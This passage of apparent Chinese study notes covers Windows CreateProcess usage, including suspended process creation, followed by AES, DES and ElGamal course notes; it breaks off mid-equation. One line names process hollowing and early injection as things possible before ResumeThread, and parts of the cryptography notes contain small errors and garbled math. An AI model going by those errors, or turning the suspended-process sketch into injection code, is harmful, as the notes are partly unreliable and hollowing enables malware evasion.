printf(&quot;Hello from Program B! &quot;); STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(&amp;si, sizeof(si)); si.cb = sizeof(si); ZeroMemory(&amp;pi, sizeof(pi)); // 创建进程A，使用 CREATE_NEW_CONSOLE if (!CreateProcess( TEXT(&quot;D:/005_Codefield/VS2019/DiShui_Test/Debug/TestA.exe&quot;), // 要启动的程序名 NULL, // 命令行参数 NULL, // 进程句柄不允许/可以被继承 NULL, // 线程句柄不允许/可以被继承 FALSE, // 不继承父进程句柄 CREATE_NEW_CONSOLE, // 创建标志，使用 CREATE_NEW_CONSOLE NULL, // NULL, // &amp;si, // 指向STARTUPINFO的指针 &amp;pi // 指向PROCESS_INFORMATION的指针 )) &#123; printf(&quot;CreateProcess failed (%d). &quot;, GetLastError()); return 1; &#125; // 等待进程A结束 WaitForSingleObject(pi.hProcess, INFINITE); // 关闭进程和线程的句柄 CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return 0;&#125; 子进程就会新起一个cmd输出，不和父进程共用一个cmd 创建挂起进程 dwCreationFlags中常用的一个参数是CREATE_SUSPENDED，以挂起的方式创建一个进程，挂起态进程被创建后，只有调用ResumeThread函数被调用，这个进程才会继续执行。 The primary thread of the new process is created in a suspended state, and does not run until the ResumeThread function is called. 如果是以挂起态的方式创建进程，之前讲到的进程的创建过程就会有变化： 12345678910111. 将EXE文件映射到低2G的空间中 - PE文件中的字段说了在哪加载2. 在高2G创建该进程的`内核对象EPROCESS` - 每个进程被创建，都要在内核空间创建一个EPROCESS3. 将系统DLL（ntdll.dll）映射到低2G空间中4. 在高2G创建该进程的`线程内核对象ETHREAD` - 进程提供了空间上的资源，跑起来要线程。一个进程至少需要一个线程，它才能跑起来+ 5. 如果是以挂起方式创建的，在这里会等待，直至ResumeThread被调用6. 恢复后继续执行： - 映射DLL（ntdll.LdrInitializeThunk） - 线程开始执行 那也就说明了：进程就是为程序提供资源，像步骤1、2、3、4；而真正执行的是线程（因为上面将线程挂起后，就没动了，直到ResumeThreadn恢复线程的执行） 在ResumeThread恢复执行前，我们可以动手脚，比如狸猫换太子，提前注入，Process Hollowing，傀儡进程等 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(&amp;si, sizeof(si)); si.cb = sizeof(si); ZeroMemory(&amp;pi, sizeof(pi)); // 使用 CREATE_SUSPENDED 创建一个初始状态为挂起的记事本进程 if (!CreateProcess( TEXT(&quot;C:\\\\Windows\\\\System32\\ otepad.exe&quot;), // 程序名称 NULL, // 命令行参数 NULL, // 进程句柄不允许/可以被继承 NULL, // 线程句柄不允许/可以被继承 FALSE, // 不继承父进程句柄 CREATE_SUSPENDED, // 创建标志，使用 CREATE_SUSPENDED NULL, // NULL, // &amp;si, // 指向STARTUPINFO的指针 &amp;pi // 指向PROCESS_INFORMATION的指针 )) &#123; printf(&quot;CreateProcess failed (%d). &quot;, GetLastError()); return 1; &#125; // 在ResumeThread前可以做一些处理 // ... // 此处恢复线程，从而开始执行记事本进程 ResumeThread(pi.hThread); // 等待进程结束 WaitForSingleObject(pi.hProcess, INFINITE); // 关闭进程和线程的句柄 CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return 0;&#125; lpCurrentDirectory 当前进程的工作目录，如果设置为NULL，默认和父进程的工作目录一样 1[in, optional] lpCurrentDirectory The full path to the current directory for the process. The string can also specify a UNC path. If this parameter is NULL, the new process will have the same current drive and directory as the calling process. (This feature is provided primarily for shells that need to start an application and specify its initial drive and working directory.) 这里说下什么是模块目录和工作目录： 模块目录：模块所在的路径 工作目录：程序工作目录。父进程使用CreateProcess时传的参数，如果是NULL，那工作目录就和和父进程的工作目录一样 例 通过GetModuleFileName和GetCurrentDirectory函数分别获得当前模块（执行文件）的目录和当前工作目录： GetModuleFileName 函数用于获取当前执行的模块（例如，您的程序）的完整路径。这包括了模块所在的目录以及模块的文件名。 GetCurrentDirectory 函数获取程序的当前工作目录，即程序运行时的活动目录。这个目录可以与模块所在的目录不同，取决于CreateProcess时lpCurrentDirectory参数的设置 Unicode版123456789101112131415161718192021222324252627#include &lt;windows.h&gt;#include &lt;tchar.h&gt;#include &lt;stdio.h&gt;int main() &#123; TCHAR modulePath[MAX_PATH]; // 存储模块路径 TCHAR currentPath[MAX_PATH]; // 存储当前工作路径 // 获取当前模块的完整路径（包括执行文件的名称） if (GetModuleFileName(NULL, modulePath, MAX_PATH) == 0) &#123; _tprintf(_T(&quot;Error getting module file name. &quot;)); return 1; &#125; // 获取当前工作目录的路径 if (GetCurrentDirectory(MAX_PATH, currentPath) == 0) &#123; _tprintf(_T(&quot;Error getting current directory. &quot;)); return 1; &#125; // 打印模块路径和当前工作路径 _tprintf(_T(&quot;Module Path: %s &quot;), modulePath); _tprintf(_T(&quot;Current Working Directory: %s &quot;), currentPath); getchar(); return 0;&#125; VS执行，父进程是VS双击执行，父进程是explorer 用途，比如fopen读文件时，未使用绝对路径，寻找的路径就是进程的当前工作目录 1fopen(&quot;D:/005_Codefield/VS2019/DiShui_Test/Debug/TestA.exe&quot;, &quot;r&quot;); //绝对路径 1fopen(&quot;A.exe&quot;, &quot;r&quot;); //在进程的当前工作目录下寻找&quot;A.exe&quot; 其他进程相关API 获取当前进程ID（PID）：GetCurrentProcessId 获取当前进程句柄：GetCurrentProcess 获取命令行：GetCommandLine 获取启动信息：GetStartupInfo 获取系统中所有进程的PID：EnumProcesses 快照：CreateToolhelp32Snapshot 猜测为什么起名叫快照：内核程序的运行时是千变万化的，比如某个线程现在存在但过一会可能就执行完了。当执行CreateToolhelp32Snapshot函数的一瞬间将系统中的信息保留下来，供开发者进行分析。这个快照是拍摄时的系统状态，相当于在这个时刻给系统内核拍了一个快照，而拍摄后系统内核的状态可能发生了变化。"},{"title":"AES","path":"/wiki/cryptography/AES.html","content":"参考网址 &lt;https://zhuanlan.zhihu.com/p/7891339&gt; 总体流程 AES加密流程图： 明文长度为128bit 密文长度 ∈\\in∈｛128,192,256｝bit 经过AES加密后的密文为128bit AES加密流程{初始轮密钥加（AddRoundKey）Nr−1轮迭代{字节代换（ByteSub）行移位（ShiftRow）列混合（MixColumn）轮密钥加（AddRoundKey）最后一轮变换{字节代换（ByteSub）行移位（ShiftRow）密钥加（AddRoundKey） 其中每轮轮密钥加的密钥由密钥拓展算法得到AES加密流程 \\begin{cases} 初始轮密钥加（AddRoundKey）\\\\[3ex] N_{r-1}轮迭代\\begin{cases}字节代换（ByteSub）\\\\ 行移位（ShiftRow）\\\\ 列混合（MixColumn）\\\\ 轮密钥加（AddRoundKey） \\end{cases}\\\\[3ex] 最后一轮变换\\begin{cases}字节代换（ByteSub）\\\\ 行移位（ShiftRow）\\\\ 密钥加（AddRoundKey）\\end{cases} \\end{cases} \\ \\ 其中每轮轮密钥加的密钥由密钥拓展算法得到 AES加密流程⎩⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎨⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎧​初始轮密钥加（AddRoundKey）Nr−1​轮迭代⎩⎪⎪⎪⎪⎨⎪⎪⎪⎪⎧​字节代换（ByteSub）行移位（ShiftRow）列混合（MixColumn）轮密钥加（AddRoundKey）​最后一轮变换⎩⎪⎪⎨⎪⎪⎧​字节代换（ByteSub）行移位（ShiftRow）密钥加（AddRoundKey）​​ 其中每轮轮密钥加的密钥由密钥拓展算法得到 AES加密过程描述如下： 初始轮密钥加。给定一个明文M和种子密钥K0K_0K0​，将它们以矩阵排列并进行异或加法（即初始密钥加）运算； Nr−1N_{r-1}Nr−1​轮迭代。对前Nr−1N_{r-1}Nr−1​轮中的每一轮，依次进行字节代换（ByteSub）、行移位（ShiftRow）、列混合（MixColumn），轮密钥加（AddRoundKey）操作 其中，轮迭代中的密钥KiK_iKi​由种子密钥K0K_0K0​通过密钥扩展算法产生 最后一轮变换。最后一轮中与前面各轮稍有不同，依次字节代换（ByteSub）、行移位（ShiftRow），轮密钥加（AddRoundKey)。 AES流程笔记{字节代换（ByteSub）行移位（ShiftRow）列混合（MixColumn）轮密钥加（AddRoundKey）密钥拓展AES流程笔记\\begin{cases} 字节代换（ByteSub）\\\\ 行移位（ShiftRow）\\\\ 列混合（MixColumn）\\\\ 轮密钥加（AddRoundKey）\\\\ 密钥拓展\\\\ \\end{cases} AES流程笔记⎩⎪⎪⎪⎪⎪⎪⎪⎨⎪⎪⎪⎪⎪⎪⎪⎧​字节代换（ByteSub）行移位（ShiftRow）列混合（MixColumn）轮密钥加（AddRoundKey）密钥拓展​ ​\t在Rijndael的设计中，其算法的明文分组和密钥长度都有三个可选值，分别为128、192和256bit，产生的密文没有数据扩展。但在AES中，明文和密文长度固定为128bit，密钥长度可使用128、192和256bit三者中的任意一种。 ​\t明文及加密过程的中间结果都称为状态State。状态State被表示成矩阵，矩阵的每个元素是一个字节，并看成是有限域GF(282^828)中的一个元素，矩阵的行数为4，列数NbN_bNb​为4 ​\t密钥被表示成4行NkN_kNk​列的矩阵 ​\t矩阵列数由明文长度or密钥长度➗32bit算出 ​\tNrN_rNr​：加密轮数 AES不同密钥长度下的Nb、Nk、NrN_b、N_k、N_rNb​、Nk​、Nr​ 明文分组矩阵列数NbN_bNb​（明文为128，分组长度是32bit，所以128/32=4） 密钥矩阵列数NkN_kNk​ 加密和解密论数NrN_rNr​ 密钥长度为128 4 4（128/32=4） 10 192 4 6（192/32=6） 12 256 4 8（256/32=8） 14 详细过程 下面以密钥长度为128bit为例，讲解AES算法具体加密过程： AES的处理单位是字节。 明文矩阵是4行4列，共4*4=16个元素（字节），输入的明文分成16个字节后，按从上到下、从左至右的顺序，排成输入矩阵，如下所示 [p0p4p8p12p1p6p9p14p2p6p10p14p3p7p11p15]\\begin{bmatrix} p_0 &amp; p_4 &amp; p_8 &amp; p_{12} \\\\ p_1 &amp; p_6 &amp; p_9 &amp; p_{14} \\\\ p_2 &amp; p_6 &amp; p_{10} &amp; p_{14} \\\\ p_3 &amp; p_7 &amp; p_{11} &amp; p_{15} \\\\ \\end{bmatrix} ⎣⎢⎢⎢⎡​p0​p1​p2​p3​​p4​p6​p6​p7​​p8​p9​p10​p11​​p12​p14​p14​p15​​⎦⎥⎥⎥⎤​ 1. 字节代换（ByteSub） 字节代换层的主要功能就是让输入的数据通过S_box表完成从一个字节到另一个字节的映射（是关于字节的非线性变换），S盒的具体计算方法上课没讲。 把状态矩阵State中的元素字节高4位作为行值，低4位作为列值，取出S盒中对应行列交叉点的元素作为输出。 AES的字节代换表（或叫S盒）如下所示： 加密图示： 2. 行移位（ShiftRow） 在行移位变换中，状态矩阵State中的每一行将以字节为单位，循环左移不同的位移量。 ​\tState的第一行保持不变，第二行循环左移一个字节，第三行循环左移两个字节，第四行循环左移三个字节。 ​\t行位移操作最为简单，它是用来将输入数据作为一个4·4的字节矩阵进行处理的，然后将这个矩阵的字节进行位置上的置换。ShiftRows子层属于AES手动的扩散层，目的是将单个位上的变换扩散到影响整个状态，从而达到雪崩效应。 3. 列混合（MixColumn） ​\t列混合变换将State乘以一个固定的矩阵A，对State逐列进行变换，每一列中的每个字节被变换成一个新值，直到4列都变换完毕。 ​\t相乘后得到的乘积矩阵，其中每个元素均是一行和一列中所对应元素的乘积之和。这里的乘法和加法都是定义在有限域GF(282^828)上的。 固定矩阵A： [02030101010203010101020303010102]\\begin{bmatrix} 02 &amp; 03 &amp; 01 &amp; 01 \\\\ 01 &amp; 02 &amp; 03 &amp; 01 \\\\ 01 &amp; 01 &amp; 02 &amp; 03 \\\\ 03 &amp; 01 &amp; 01 &amp; 02 \\\\ \\end{bmatrix} ⎣⎢⎢⎢⎡​02010103​03020101​01030201​01010302​⎦⎥⎥⎥⎤​ ​ 列混淆子层是AES算法中最为复杂的部分，属于扩散层，列混淆操作是AES算法中主要的扩散元素，它混淆了输入矩阵的每一列，使输入的每个字节都会影响到4个输出字节。行位移子层和列混淆子层的组合使得经过三轮处理以后，矩阵的每个字节都依赖于16个明文字节成可能。其中包含了矩阵乘法、伽罗瓦域内加法和乘法的相关知识。 ​ 4. 轮密钥加（AddRoundKey） 密钥加是将轮密钥 KiK_iKi​与状态 State 进行逐比特异或。 轮密钥KiK_iKi​由种子密钥 K0K_0K0​ 通过密钥扩展算法得到。 5. 密钥拓展算法 由密钥扩展算法将种子密钥扩展成为扩展密钥的计算过程如下： W[i]={W[i−Nk]⊕temp (i mod Nk=0)W[i−Nk]⊕W[i−1](i mod Nk≠0)temp=SubByte(RotByte(W[i−1]))⊕Rcon[i]W[i]=\\begin{cases} W[i-N_k]⊕temp\\qquad\\ \\ \\ \\ \\ \\ (i\\;mod\\;N_k=0)\\\\[2ex] W[i-N_k]⊕W[i-1]\\qquad(i\\;mod\\;N_k e0)\\\\ \\end{cases}\\\\[4ex] temp=SubByte(RotByte(W[i-1]))⊕Rcon[i] W[i]=⎩⎪⎨⎪⎧​W[i−Nk​]⊕temp (imodNk​=0)W[i−Nk​]⊕W[i−1](imodNk​=0)​temp=SubByte(RotByte(W[i−1]))⊕Rcon[i] temp首先将4个输入字节进行翻转，并执行一个按字节的S盒代换，最后用第一个字节与轮系数Rcon进行异或运算。 目的：一是增加密钥编排中的非线性；二是消除AES中的对称性。 这两种属性都是抵抗某些分组密码攻击必要的。 其中， RotByte()：循环左移一个字节 SubByte()：S盒字节代换 Rcon[i]为轮常数，定义为： Rcon[i]=(RC[i],00,00,00)其中{RC[1]=1，即01RC[i]=x⋅RC[i−1]=xk−1,(i≥2)Rcon[i]=(RC[i],00,00,00)\\\\[2ex] 其中\\begin{cases}RC[1]=1，即01\\\\[2ex] RC[i]=x\\cdot RC[i-1]=x^{k-1},(i\\ge2) \\end{cases} Rcon[i]=(RC[i],00,00,00)其中⎩⎪⎨⎪⎧​RC[1]=1，即01RC[i]=x⋅RC[i−1]=xk−1,(i≥2)​ ​\t字节用十六进制表示，同时为 GF(28)GF(2^8)GF(28)上的元素. ​\t其中 xi−1x_{i-1}xi−1​ 为 GF(28)GF(2^8)GF(28)域中的多项式 x 的 i-1次方所对应的字节。 ​ 由于 x 对应的字节为 02，上式也可以写为 Rcon[i]=((02)i−1,00,00,00)Rcon[i]=((02)^{i-1},00,00,00) Rcon[i]=((02)i−1,00,00,00) Rcon[i]数据表（直接看这个表，上面Rcon[i]的定义课上没讲） i 1 2 3 4 5 6 7 8 9 10 Rcon[i] 01000000 02000000 04000000 08000000 10000000 20000000 40000000 80000000 1b000000 36000000 AES密钥大致流程： ​\t子密钥的生成是以列为单位进行的，一列是32Bit，四列组成子密钥共128Bit。生成子密钥的数量比AES算法的轮数多一个，因为第一个密钥加法层进行密钥漂白时也需要子密钥。 ​\t密钥漂白是指在AES的输入盒输出中都使用的子密钥的XOR加法。 ​\t子密钥在图中都存储在W[0]、W[1]、…、W[43]的扩展密钥数组之中。 ​\tk1-k16表示原始密钥对应的字节，而图中子密钥k0与原始子密钥相同。 ​\t在生成的扩展密钥中W的下标如果是4的倍数时(从零开始)需要对异或的参数进行G函数处理。 在加密时行位移处理与解密时的处理相反，我们这里将解密时的处理称作逆行位移。它之所以称作行位移，是因为它只在4·4矩阵的行间进行操作，每行4字节的数据。在加密时，保持矩阵的第一行不变，第二行向左移动8Bit(一个字节)、第三行向左移动2个字节、第四行向左移动3个字节。而在解密时恰恰相反，依然保持第一行不变，将第二行向右移动一个字节、第三行右移2个字节、第四行右移3个字节。操作结束！"},{"title":"DES","path":"/wiki/cryptography/DES.html","content":"总体介绍 DES的结构是典型的Feistel密码结构。 DES笔记脉络{初始置换IP轮结构{扩展置换E轮密钥Ki生成过程{置换选择PC_1循环左移置换选择PC_2S盒代换P盒置换逆初始置换IP−1DES笔记脉络 \\begin{cases} 初始置换IP\\\\ 轮结构\\begin{cases}扩展置换E\\\\ 轮密钥K_i生成过程\\begin{cases}置换选择PC\\_1\\\\ 循环左移\\\\ 置换选择PC\\_2\\end{cases}\\\\ S盒代换\\\\ P盒置换\\end{cases}\\\\ 逆初始置换IP^{-1} \\end{cases} DES笔记脉络⎩⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎨⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎧​初始置换IP轮结构⎩⎪⎪⎪⎪⎪⎪⎪⎪⎪⎨⎪⎪⎪⎪⎪⎪⎪⎪⎪⎧​扩展置换E轮密钥Ki​生成过程⎩⎪⎪⎨⎪⎪⎧​置换选择PC_1循环左移置换选择PC_2​S盒代换P盒置换​逆初始置换IP−1​ 明文分组长为64bit。 初始密钥为64bit，其中，第8、16、24、32、40、48、56、64为奇偶检验位，实际密钥长为56bit。 详细过程 DES加密过程由三个阶段来完成： 首先是一个初始置换IP,用于重排明文分组的64bit数据 然后是具有相同功能的16轮迭代，每轮中都有置换和代换运算，第16轮变换的输出分为左右两半，并交换次序 最后再经过一一个逆初始置换IP−1IP^{-1}IP−1(IP的逆)从而产生64bit的密文 1. 初始置换IP 对64bit的明文M中的各位进行换位，打乱明文中各位的排列次序。(其实IP和IP−1IP^{-1}IP−1在密码方面作用不大，意义在于打乱原来输入明文的ASCII码字划分的关系。 经过IP置换，明文中原有的m58m_{58}m58​放在第1位，m50m_{50}m50​放在第2位，依此类推，m7m_7m7​放在第64位。输入64bit的明文M(m1,m2,m3⋯m64)M(m_1,m_2,m_3\\cdots m_{64})M(m1​,m2​,m3​⋯m64​)，经过IP置为： X(m58,m50,m42⋯m7)X(m_{58},m_{50},m_{42}\\cdots m_7) X(m58​,m50​,m42​⋯m7​) 这里X=IP(M) 初始置换IP表8*8=64bit 第1列 第2列 第3列 第4列 第5列 第6列 第7列 第8列 第1行 58 50 42 34 26 18 10 2 第2行 60 52 44 36 28 20 12 4 第3行 62 54 46 38 30 22 14 6 第4行 64 56 48 40 32 24 16 8 第5行 57 49 41 33 25 17 9 1 第6行 59 51 43 35 27 19 11 3 第7行 61 53 45 37 29 21 13 5 第8行 63 55 47 39 31 23 15 7 2. 轮结构 ​\t64bit的明文M经初始IP置换后，分成左L0L_0L0​和右R0R_0R0​两个32bit的部分，然后经过16轮迭代后再输出。 ​\t每轮迭代的结构和Feistel加密结构一样，如上图4-5所示。其数学公式如下 {Li=Ri−1Ri=Li−1⊕F(Ri−1,Ki)\\begin{cases} L_i=R_{i-1}\\\\ R_i=L_{i-1}⊕F(R_{i-1},K_i) \\end{cases} {Li​=Ri−1​Ri​=Li−1​⊕F(Ri−1​,Ki​)​ 式中： F(Ri−1,Ki)F(R_{i-1},K_i)F(Ri−1​,Ki​)：第 iii 轮的轮函数(图中虚线框) ⊕：两个比特串的异或 Li−1，Ri−1L_{i-1}，R_{i-1}Li−1​，Ri−1​：第 i−1i-1i−1 轮的左、右两部分 Li，RiL_{i}，R_{i}Li​，Ri​：第iii轮的左、右两部分（各32bit） KiK_iKi​ 是第 iii 轮用的子密钥（48bit） 轮结构中的核心是F(Ri−1,Ki)F(R_{i-1},K_i)F(Ri−1​,Ki​)函数，它是每轮实现混乱和扩散的关键模块。其基本加密结构如下图4-6所示。 F(Ri−1,Ki)F(R_{i-1},K_i)F(Ri−1​,Ki​)函数的执行过程包括： ​\t扩展置换E表：将输入的32bitRi−1R_{i-1}Ri−1​置换成48bit； ​\t这48bit与子密钥KiK_iKi​(48bit)进行异或运算； ​\t代换选择S盒：结果输入S盒，输出32bit的输出 （输入为48bit，输出为32bit）； ​\t置换P表：最后经过P置换后即为F(Ri−1,Ki)F(R_{i-1},K_i)F(Ri−1​,Ki​)函数的输出。 （1）扩展置换E表 ​ 扩展置换E将32bit的输入分成8组，每组4bit，经置换E的扩展后，变成每组6bit输出 扩展后的结果与子密钥KiK_iKi​进行异或运算，结果作为S盒的输入 （2）轮密钥KiK_iKi​生成过程 子密钥K;的生成大致分成三个过程: ​\t1）置换选择PC_1 ​\t2）循环左移 ​\t3）置换选择PC_2 ​\t1）置换选择PC_1 ​ 初始密钥K为64bit，经过置换选择PC_1去掉密钥中的8个奇偶检验位，并对其余的56位打乱重新排序 ​ 将置换后的56bit分为各28bit的左C0C_0C0​、右D0D_0D0​两半。 ​ PC1(K)=C0D0PC_1(K)=C_0D_0PC1​(K)=C0​D0​，其中C0C_0C0​由PC1(K)PC_1(K)PC1​(K)前28位组成，D0D_0D0​由后28位组成 选择置换PC_1 第1列 第2列 第3列 第4列 第5列 第6列 第7列 第1行 57 49 41 33 25 17 9 第2行 1 58 50 42 34 26 18 第3行 10 2 59 51 43 35 27 第4行 19 11 3 60 52 44 36 第5行 63 55 47 39 31 23 15 第6行 7 62 54 46 38 30 22 第7行 14 6 61 53 45 37 29 第8行 21 13 5 28 20 12 4 密钥k中有8位奇偶检验位，分别位于8，16，24，32，40，48，56，64位，奇偶检验位用于检查密钥k在产生、分配及存储过程中可能发生的错误 2）循环左移 ​ 1≤i≤161≤i≤161≤i≤16，Ci=LSi(Ci−1)C_i=LS_i(C_{i-1})Ci​=LSi​(Ci−1​)，Di=LSi(Di−1)D_i=LS_i(D_{i-1})Di​=LSi​(Di−1​)，在第 iii 轮分别对Ci−1C_{i-1}Ci−1​和Di−1D_{i-1}Di−1​进行循环左移，所移位数为 iii 位。 ​ （当i=1,2,9,16i=1,2, 9, 16i=1,2,9,16时，则左移1个位置，其余左移2个位置。如下表所示） 迭代次数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 左移位数 1 1 2 2 2 2 2 2 1 2 2 2 2 2 2 1 ​ 移位后的结果作为求下一轮子密钥的输入，同时也作为置换选择PC_2的输入。 ​ 3）置换选择PC_2 ​ Ki=PC_2(CiDi)K_i=PC\\_2(C_iD_i)Ki​=PC_2(Ci​Di​)，PC2PC_2PC2​为固定置换，用于从56bit的CiDiC_iD_iCi​Di​中选取48位作为第 iii 轮迭代的子密钥KiK_iKi​ ​ 子密钥中KiK_iKi​中的各位从左到右依次为CiDiC_iD_iCi​Di​中的第14，17，⋯，29，3214，17，\\cdots，29，3214，17，⋯，29，32位 选择置换PC_2 第1列 第2列 第3列 第4列 第5列 第6列 第1行 14 17 11 24 1 5 第2行 3 28 15 6 21 10 第3行 23 19 12 4 26 8 第4行 16 7 27 20 13 2 第5行 41 52 31 37 47 55 第6行 30 40 21 45 33 48 第7行 44 49 39 56 34 53 第8行 46 42 50 36 29 32 （3）S盒代换 输入为48bit，经S盒后输出为32bit，输出结果为P盒置换的输入。 轮函数中的代换由8个S盒组成，每个S盒的输入长为6位、输出长为4位， 对于S盒，其6位输入中，第1位和第6位形成一个2位二进制数，用来选择S的行，中间4位用来选择列。 行和列选定后，得到其交叉位置的十进制数，将这个数表示为4位二进制数即得这一S盒的输出。 S1S_1S1​ 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 0 14 4 13 1 2 15 11 8 3 10 6 12 5 9 0 7 1 0 15 07 4 14 2 13 1 10 6 12 11 9 5 3 8 2 4 1 14 8 13 6 2 11 15 12 9 7 3 10 5 0 3 15 12 8 2 4 9 1 7 5 11 3 14 10 0 6 13 S2S_2S2​ 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 0 15 1 8 14 6 11 3 4 9 7 2 13 12 0 5 10 1 3 13 4 7 15 2 8 14 12 0 1 10 6 9 11 5 2 0 14 7 11 10 4 13 1 5 8 12 6 9 3 2 15 3 13 8 10 1 3 15 4 2 11 6 7 12 0 5 14 9 S3S_3S3​ 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 0 10 0 9 14 6 3 15 5 1 13 12 7 11 4 2 8 1 13 7 0 9 3 4 6 10 2 8 5 14 12 11 15 1 2 13 6 4 9 8 15 3 0 11 1 2 12 5 10 14 7 3 1 10 13 0 6 9 8 7 4 15 14 3 11 5 2 12 S4S_4S4​ 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 0 7 13 14 3 0 6 9 10 1 2 8 5 11 12 4 15 1 13 8 11 5 6 15 0 3 4 7 2 12 1 10 14 9 2 10 6 9 0 12 11 7 13 15 1 3 14 5 2 8 4 3 3 15 0 6 10 1 13 8 9 4 5 11 12 7 2 14 S5S_5S5​ 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 0 2 12 4 1 7 10 11 6 8 5 3 15 13 0 14 9 1 14 11 2 12 4 7 13 1 5 0 15 10 3 9 8 6 2 4 2 1 11 10 13 7 8 15 9 12 5 6 3 0 14 3 11 8 12 7 1 14 2 13 6 15 0 9 10 4 5 3 S6S_6S6​ 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 0 12 1 10 15 9 2 6 8 0 13 3 4 14 7 5 11 1 10 15 4 2 7 12 9 5 6 1 13 14 0 11 3 8 2 9 14 15 5 2 8 12 3 7 0 4 10 1 13 11 6 3 4 3 2 12 9 5 15 10 11 14 1 7 6 0 8 13 S7S_7S7​ 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 0 4 11 2 14 15 0 8 13 3 12 9 7 5 10 6 1 1 13 0 11 7 4 9 1 10 14 3 5 12 2 15 8 6 2 1 4 11 13 12 3 7 14 10 15 6 8 0 5 9 2 3 6 11 13 8 1 4 10 7 9 5 0 15 14 2 3 12 S8S_8S8​ 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 0 13 2 8 4 6 15 11 1 10 9 3 14 5 0 12 7 1 1 15 13 8 10 3 7 4 12 5 6 11 0 14 9 2 2 7 11 4 1 9 12 14 2 0 6 10 13 15 3 5 8 3 2 1 14 7 4 10 8 13 15 12 9 0 3 5 6 11 ​\tDES算法中除了S盒是非线性变换外，其余变换均为线性变换，DES算法保密的关键在于S盒。S盒是经过精心设计和严格挑选的，美国国家安全局(NSA)曾公布了下列几条设 计准则: ●S盒的每一行是整数0~15的一个置换； ●没有一个S盒是它输入变量的线性函数; ●改变S盒输入中的某1bit, 至少引起2bit的输出变化; ●对任一S盒的任何两 个输入x和x⊕001100， 则对应的输出至少有2bit不同; ●对任一S盒的任何两 个输入x和x⊕11ab00 (其中a, b属于{0,1}), 则对应的输出至少 有2bit不同; ●任一S盒的6bit输入，若某lbit输入保持不变，当其它5bit输入变化时，则输出中的0与1数目分布的总数接近相等。 （4）P盒置换 ​\tP盒置换将S盒的32bit输出重新排列，排列后的32bit即为函数F(Ri−1,Ki)F(R_{i-1},K_i)F(Ri−1​,Ki​)的输出。 P盒置换表 第1列 第2列 第3列 第4列 第5列 第6列 第7列 第8列 第1行 16 7 20 21 29 12 28 17 第2行 1 15 23 26 5 18 31 10 第3行 2 8 24 14 32 27 3 9 第4行 19 13 30 6 22 11 4 25 3. 逆初始置换IP−1逆初始置换IP^{-1}逆初始置换IP−1 DES算法经过16轮迭代后，最后一步是逆初始置换，该置换IP−1IP^{-1}IP−1如下表所示，将第16轮迭代的输出经过逆初始置换Ip-处理得到密文C，即 C=IP−1(R16L16)C=IP^{-1}(R_{16}L_{16}) C=IP−1(R16​L16​) 逆初始置换IP−1IP^{-1}IP−1 第1列 第2列 第3列 第4列 第5列 第6列 第7列 第1行 40 8 48 16 56 24 64 32 第2行 39 7 47 15 55 23 63 31 第3行 38 6 46 14 54 22 62 30 第4行 37 5 45 13 53 21 61 29 第5行 36 4 44 12 52 20 60 28 第6行 35 3 43 11 51 19 59 27 第7行 34 2 42 10 50 18 58 26 第8行 33 1 41 9 49 17 57 25"},{"title":"ElGamal","path":"/wiki/cryptography/ElGamal.html","content":"前置知识 本原元（《杨波》P91） 若g是n的本原元素，则(g,g2,⋯ ,gψ(n))(g,g^2,\\cdots,g^{\\psi(n)})(g,g2,⋯,gψ(n))在mod n下互不相同且都与n互素 特别地，若n是一个素数p；则(g,g2,⋯ ,gp−1)(g,g^2,\\cdots,g^{p-1})(g,g2,⋯,gp−1)在mod n下都不相同 例子 n=19，g=3，31到3183^1到3^{18}31到318在mod 19下的幂分别为3, 9, 8, 5, 15, 7, 2, 6, 18, 16, 10, 11, 14, 4, 12, 17, 13, 1。即，3为19的本原元素 本原元素不唯一，可验证除3外，19的本原元素还有2，10，13，14，15 ElGamal ElGamal笔记脉络{选取公共参数确定公私钥对加密变换解密变换ElGamal笔记脉络\\begin{cases} 选取公共参数\\\\ 确定公私钥对\\\\ 加密变换\\\\ 解密变换 \\end{cases} ElGamal笔记脉络⎩⎪⎪⎪⎪⎨⎪⎪⎪⎪⎧​选取公共参数确定公私钥对加密变换解密变换​ 选取公共参数 选择大素数p和α\\alphaα（α\\alphaα 是Zp∗Z^*_pZp∗​上的一个生成元） （p和α\\alphaα公开） 确定公私钥对 ​\t随机选取整数d∈（0，p−1）d\\in （0，p-1）d∈（0，p−1）（作为私钥），计算公钥y=αd mod py=\\alpha^d\\ mod\\ py=αd mod p\t（d是私钥，y是公钥） 加密变换 ​\t对于任意明文m∈Zp∗m\\in Z^*_pm∈Zp∗​，随机选取一个整数k∈(1,p−1)k\\in(1,p-1)k∈(1,p−1)，计算密文 (c1,c2)=(αk mod p,myk mod p)(c_1,c_2)=(\\alpha^k\\ mod\\ p,my^k\\ mod\\ p) (c1​,c2​)=(αk mod p,myk mod p) 解密变换 对任意密文(c1,c2)∈Zp∗×Zp∗(c_1,c_2)\\in Z^*_p\\times Z^*_p(c1​,c2​)∈Zp∗​×Zp∗​，使用私钥d进行解密得出明文m m=c2(c1d)−1 mod pm=c_2(c_1^d)^{-1}\\ mod\\ p m=c2​(c1d​)−1 mod p 证明如下： 已知： c1=αk modpc2=myk mod py=αd mod pc_1=\\alpha^k\\ mod p\\\\ c_2=my^k\\ mod\\ p\\\\ y=\\alpha^d\\ mod\\ p c1​=αk modpc2​=myk mod py=αd mod p 开始推导： \\begin{equation}\\begin{split} 